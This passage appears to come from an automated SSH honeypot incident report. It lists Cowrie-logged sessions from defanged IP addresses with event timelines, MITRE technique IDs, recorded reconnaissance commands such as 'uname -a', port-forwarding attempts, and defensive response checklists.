| **First Seen** | 2026-08-19 18:03 |
| **Last Seen** | 2026-08-19 18:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:03:58` | `cowrie.session.connect` |
| `2026-08-19 18:03:58` | `cowrie.client.version` |
| `2026-08-19 18:03:58` | `cowrie.client.kex` |
| `2026-08-19 18:04:00` | `cowrie.login.success` |
| `2026-08-19 18:04:01` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.245.210[.]70` to AbuseIPDB if not already reported
- [ ] Block `58.245.210[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-533d2cd6b879

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 18:05 |
| **Last Seen** | 2026-08-19 18:06 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:05:55` | `cowrie.session.connect` |
| `2026-08-19 18:05:57` | `cowrie.client.version` |
| `2026-08-19 18:05:57` | `cowrie.client.kex` |
| `2026-08-19 18:06:03` | `cowrie.login.success` |
| `2026-08-19 18:06:07` | `cowrie.session.params` |
| `2026-08-19 18:06:07` | `cowrie.command.input` |
| `2026-08-19 18:06:09` | `cowrie.log.closed` |
| `2026-08-19 18:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73fc4f4dc07a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:08 |
| **Last Seen** | 2026-08-19 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:08:57` | `cowrie.session.connect` |
| `2026-08-19 18:08:57` | `cowrie.client.version` |
| `2026-08-19 18:08:57` | `cowrie.client.kex` |
| `2026-08-19 18:08:57` | `cowrie.login.success` |
| `2026-08-19 18:08:58` | `cowrie.session.params` |
| `2026-08-19 18:08:58` | `cowrie.command.input` |
| `2026-08-19 18:08:58` | `cowrie.log.closed` |
| `2026-08-19 18:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91576ad40227

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:14 |
| **Last Seen** | 2026-08-19 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:14:54` | `cowrie.session.connect` |
| `2026-08-19 18:14:54` | `cowrie.client.version` |
| `2026-08-19 18:14:54` | `cowrie.client.kex` |
| `2026-08-19 18:14:54` | `cowrie.login.success` |
| `2026-08-19 18:14:55` | `cowrie.session.params` |
| `2026-08-19 18:14:55` | `cowrie.command.input` |
| `2026-08-19 18:14:55` | `cowrie.log.closed` |
| `2026-08-19 18:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3856deebbce3

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 18:18 |
| **Last Seen** | 2026-08-19 18:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:18:34` | `cowrie.session.connect` |
| `2026-08-19 18:18:36` | `cowrie.client.version` |
| `2026-08-19 18:18:36` | `cowrie.client.kex` |
| `2026-08-19 18:18:42` | `cowrie.login.success` |
| `2026-08-19 18:18:46` | `cowrie.session.params` |
| `2026-08-19 18:18:46` | `cowrie.command.input` |
| `2026-08-19 18:18:47` | `cowrie.log.closed` |
| `2026-08-19 18:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71f761e58d6e

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-08-19 18:19 |
| **Last Seen** | 2026-08-19 18:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:19:08` | `cowrie.session.connect` |
| `2026-08-19 18:19:08` | `cowrie.client.version` |
| `2026-08-19 18:19:08` | `cowrie.client.kex` |
| `2026-08-19 18:19:10` | `cowrie.login.success` |
| `2026-08-19 18:19:10` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea42999ce303

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-08-19 18:20 |
| **Last Seen** | 2026-08-19 18:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:20:17` | `cowrie.session.connect` |
| `2026-08-19 18:20:17` | `cowrie.client.version` |
| `2026-08-19 18:20:17` | `cowrie.client.kex` |
| `2026-08-19 18:20:19` | `cowrie.login.success` |
| `2026-08-19 18:20:20` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a418726e6b

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:20 |
| **Last Seen** | 2026-08-19 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:20:50` | `cowrie.session.connect` |
| `2026-08-19 18:20:50` | `cowrie.client.version` |
| `2026-08-19 18:20:51` | `cowrie.client.kex` |
| `2026-08-19 18:20:51` | `cowrie.login.success` |
| `2026-08-19 18:20:52` | `cowrie.session.params` |
| `2026-08-19 18:20:52` | `cowrie.command.input` |
| `2026-08-19 18:20:52` | `cowrie.log.closed` |
| `2026-08-19 18:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72691ceb7b0

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:26 |
| **Last Seen** | 2026-08-19 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:26:47` | `cowrie.session.connect` |
| `2026-08-19 18:26:47` | `cowrie.client.version` |
| `2026-08-19 18:26:47` | `cowrie.client.kex` |
| `2026-08-19 18:26:47` | `cowrie.login.success` |
| `2026-08-19 18:26:48` | `cowrie.session.params` |
| `2026-08-19 18:26:48` | `cowrie.command.input` |
| `2026-08-19 18:26:48` | `cowrie.log.closed` |
| `2026-08-19 18:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3965c0c4b784

| Field | Detail |
|---|---|
| **Source IP** | `120.26.202[.]34` |
| **First Seen** | 2026-08-19 18:29 |
| **Last Seen** | 2026-08-19 18:29 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:29:09` | `cowrie.session.connect` |
| `2026-08-19 18:29:10` | `cowrie.client.version` |
| `2026-08-19 18:29:10` | `cowrie.client.kex` |
| `2026-08-19 18:29:38` | `cowrie.login.success` |
| `2026-08-19 18:29:55` | `cowrie.session.params` |
| `2026-08-19 18:29:55` | `cowrie.command.input` |
| `2026-08-19 18:29:59` | `cowrie.log.closed` |
| `2026-08-19 18:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.202[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.26.202[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1fa98d3661b

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 18:31 |
| **Last Seen** | 2026-08-19 18:31 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:31:09` | `cowrie.session.connect` |
| `2026-08-19 18:31:10` | `cowrie.client.version` |
| `2026-08-19 18:31:10` | `cowrie.client.kex` |
| `2026-08-19 18:31:17` | `cowrie.login.success` |
| `2026-08-19 18:31:22` | `cowrie.session.params` |
| `2026-08-19 18:31:22` | `cowrie.command.input` |
| `2026-08-19 18:31:23` | `cowrie.log.closed` |
| `2026-08-19 18:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a04667f11de4

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:32 |
| **Last Seen** | 2026-08-19 18:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:32:44` | `cowrie.session.connect` |
| `2026-08-19 18:32:44` | `cowrie.client.version` |
| `2026-08-19 18:32:44` | `cowrie.client.kex` |
| `2026-08-19 18:32:44` | `cowrie.login.success` |
| `2026-08-19 18:32:45` | `cowrie.session.params` |
| `2026-08-19 18:32:45` | `cowrie.command.input` |
| `2026-08-19 18:32:45` | `cowrie.log.closed` |
| `2026-08-19 18:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-608ca75dca61

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-08-19 18:37 |
| **Last Seen** | 2026-08-19 18:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:37:25` | `cowrie.session.connect` |
| `2026-08-19 18:37:26` | `cowrie.client.version` |
| `2026-08-19 18:37:26` | `cowrie.client.kex` |
| `2026-08-19 18:37:28` | `cowrie.login.success` |
| `2026-08-19 18:37:28` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6401fbc899e1

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-08-19 18:37 |
| **Last Seen** | 2026-08-19 18:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:37:33` | `cowrie.session.connect` |
| `2026-08-19 18:37:34` | `cowrie.client.version` |
| `2026-08-19 18:37:34` | `cowrie.client.kex` |
| `2026-08-19 18:37:35` | `cowrie.login.success` |
| `2026-08-19 18:37:36` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053b3b7fd93e

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:38 |
| **Last Seen** | 2026-08-19 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:38:41` | `cowrie.session.connect` |
| `2026-08-19 18:38:41` | `cowrie.client.version` |
| `2026-08-19 18:38:41` | `cowrie.client.kex` |
| `2026-08-19 18:38:41` | `cowrie.login.success` |
| `2026-08-19 18:38:42` | `cowrie.session.params` |
| `2026-08-19 18:38:42` | `cowrie.command.input` |
| `2026-08-19 18:38:42` | `cowrie.log.closed` |
| `2026-08-19 18:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53772dc5e83b

| Field | Detail |
|---|---|
| **Source IP** | `180.76.235[.]175` |
| **First Seen** | 2026-08-19 18:43 |
| **Last Seen** | 2026-08-19 18:49 |
| **Session Duration** | 388s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:43:03` | `cowrie.session.connect` |
| `2026-08-19 18:44:30` | `cowrie.client.version` |
| `2026-08-19 18:44:30` | `cowrie.client.kex` |
| `2026-08-19 18:44:32` | `cowrie.login.success` |
| `2026-08-19 18:49:32` | `cowrie.session.file_upload` |
| `2026-08-19 18:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.235[.]175` to AbuseIPDB if not already reported
- [ ] Block `180.76.235[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6746cc2bec1

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 18:43 |
| **Last Seen** | 2026-08-19 18:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:43:44` | `cowrie.session.connect` |
| `2026-08-19 18:43:46` | `cowrie.client.version` |
| `2026-08-19 18:43:46` | `cowrie.client.kex` |
| `2026-08-19 18:43:52` | `cowrie.login.success` |
| `2026-08-19 18:43:56` | `cowrie.session.params` |
| `2026-08-19 18:43:56` | `cowrie.command.input` |
| `2026-08-19 18:43:58` | `cowrie.log.closed` |
| `2026-08-19 18:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d49c1774cf

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:44 |
| **Last Seen** | 2026-08-19 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:44:38` | `cowrie.session.connect` |
| `2026-08-19 18:44:38` | `cowrie.client.version` |
| `2026-08-19 18:44:38` | `cowrie.client.kex` |
| `2026-08-19 18:44:39` | `cowrie.login.success` |
| `2026-08-19 18:44:40` | `cowrie.session.params` |
| `2026-08-19 18:44:40` | `cowrie.command.input` |
| `2026-08-19 18:44:40` | `cowrie.log.closed` |
| `2026-08-19 18:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d313bcf9e61

| Field | Detail |
|---|---|
| **Source IP** | `222.175.187[.]214` |
| **First Seen** | 2026-08-19 18:47 |
| **Last Seen** | 2026-08-19 18:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:47:25` | `cowrie.session.connect` |
| `2026-08-19 18:47:26` | `cowrie.client.version` |
| `2026-08-19 18:47:26` | `cowrie.client.kex` |
| `2026-08-19 18:47:28` | `cowrie.login.success` |
| `2026-08-19 18:47:29` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.175.187[.]214` to AbuseIPDB if not already reported
- [ ] Block `222.175.187[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed4f9d3eecd

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:50 |
| **Last Seen** | 2026-08-19 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:50:35` | `cowrie.session.connect` |
| `2026-08-19 18:50:35` | `cowrie.client.version` |
| `2026-08-19 18:50:35` | `cowrie.client.kex` |
| `2026-08-19 18:50:36` | `cowrie.login.success` |
| `2026-08-19 18:50:37` | `cowrie.session.params` |
| `2026-08-19 18:50:37` | `cowrie.command.input` |
| `2026-08-19 18:50:37` | `cowrie.log.closed` |
| `2026-08-19 18:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2267f19d2145

| Field | Detail |
|---|---|
| **Source IP** | `213.234.9[.]218` |
| **First Seen** | 2026-08-19 18:52 |
| **Last Seen** | 2026-08-19 18:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:52:40` | `cowrie.session.connect` |
| `2026-08-19 18:52:41` | `cowrie.client.version` |
| `2026-08-19 18:52:41` | `cowrie.client.kex` |
| `2026-08-19 18:52:42` | `cowrie.login.success` |
| `2026-08-19 18:52:43` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.234.9[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.234.9[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a90b1d933a

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-08-19 18:52 |
| **Last Seen** | 2026-08-19 18:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:52:53` | `cowrie.session.connect` |
| `2026-08-19 18:52:53` | `cowrie.client.version` |
| `2026-08-19 18:52:53` | `cowrie.client.kex` |
| `2026-08-19 18:52:56` | `cowrie.login.success` |
| `2026-08-19 18:52:57` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1342d0bf14cd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-19 18:53 |
| **Last Seen** | 2026-08-19 18:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:53:29` | `cowrie.session.connect` |
| `2026-08-19 18:53:29` | `cowrie.client.version` |
| `2026-08-19 18:53:29` | `cowrie.client.kex` |
| `2026-08-19 18:53:29` | `cowrie.login.success` |
| `2026-08-19 18:53:29` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:53:29` | `cowrie.direct-tcpip.data` |
| `2026-08-19 18:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-681d276c4970

| Field | Detail |
|---|---|
| **Source IP** | `39.183.162[.]243` |
| **First Seen** | 2026-08-19 18:53 |
| **Last Seen** | 2026-08-19 18:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:53:44` | `cowrie.session.connect` |
| `2026-08-19 18:53:46` | `cowrie.client.version` |
| `2026-08-19 18:53:46` | `cowrie.client.kex` |
| `2026-08-19 18:53:51` | `cowrie.login.success` |
| `2026-08-19 18:53:53` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.183.162[.]243` to AbuseIPDB if not already reported
- [ ] Block `39.183.162[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b57b37e0caff

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]50` |
| **First Seen** | 2026-08-19 18:53 |
| **Last Seen** | 2026-08-19 18:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:53:56` | `cowrie.session.connect` |
| `2026-08-19 18:53:57` | `cowrie.client.version` |
| `2026-08-19 18:53:57` | `cowrie.client.kex` |
| `2026-08-19 18:53:58` | `cowrie.login.success` |
| `2026-08-19 18:53:59` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]50` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-147b7a8ba262

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-08-19 18:53 |
| **Last Seen** | 2026-08-19 18:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:53:58` | `cowrie.session.connect` |
| `2026-08-19 18:53:59` | `cowrie.client.version` |
| `2026-08-19 18:53:59` | `cowrie.client.kex` |
| `2026-08-19 18:53:59` | `cowrie.login.success` |
| `2026-08-19 18:54:00` | `cowrie.direct-tcpip.request` |
| `2026-08-19 18:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
